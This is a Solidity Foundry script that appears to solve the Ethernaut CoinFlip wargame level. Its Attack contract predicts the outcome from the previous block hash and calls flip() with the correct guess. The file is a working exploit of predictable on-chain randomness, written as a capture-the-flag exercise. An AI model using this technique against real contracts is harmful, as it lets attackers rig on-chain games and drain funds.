// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

contract CoinFlipSolve is Script{
    CoinFlip public level3 = CoinFlip(0x263392b275925c65fb2890bB7ABcF7f900Cd82d1);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attack(level3)._flip();
        console.log("Consecutive wins : ",level3.consecutiveWins());
        vm.stopBroadcast();

    }
}

contract Attack{
    CoinFlip public _level3;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    constructor(CoinFlip _l3){
        _level3 = _l3;
    }
    function _flip() public{
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        require(_level3.flip(side), "Incorrect Guess");
    }
}